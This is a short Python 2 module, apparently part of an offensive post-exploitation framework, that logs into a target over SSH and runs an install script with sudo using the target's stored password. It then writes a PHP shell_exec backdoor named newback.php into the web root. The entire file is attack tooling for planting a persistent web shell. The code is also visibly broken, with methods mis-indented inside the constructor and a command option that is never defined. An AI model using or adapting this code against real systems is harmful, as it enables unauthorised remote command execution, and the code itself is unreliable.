from module import *

class WebMod(Module):

    def __init__(self, target, command, core):
	self.core = core
	self.target = target
	self.name = "Web"
	self.command = command
	self.options = {
		"location" : Option("name", "newback.php", "location of file", False)
	}
	
	def get_value(self, name):
	    if name in self.options:
		return self.options[name].value
	    else: return None
	def do_show(self, args):
	    if args == "options":
		self.do_help(args)
	    else:
		print BAD + "Unknown option %s", args
	
	def check_valid(self):
	    return True
	
	def exploit(self):
	    
	    location = self.get_value("location")
	    command = self.get_value("command")
	    
	    self.target.scpFiles(self, "web/install.sh", False)
            self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S bash install.sh")
            print("Starting Apache server.")

	    self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S echo \'shell_exec(\"" + command + "\")\' > /var/www/html/" + location)
	    print(GOOD + self.name + " module success") 
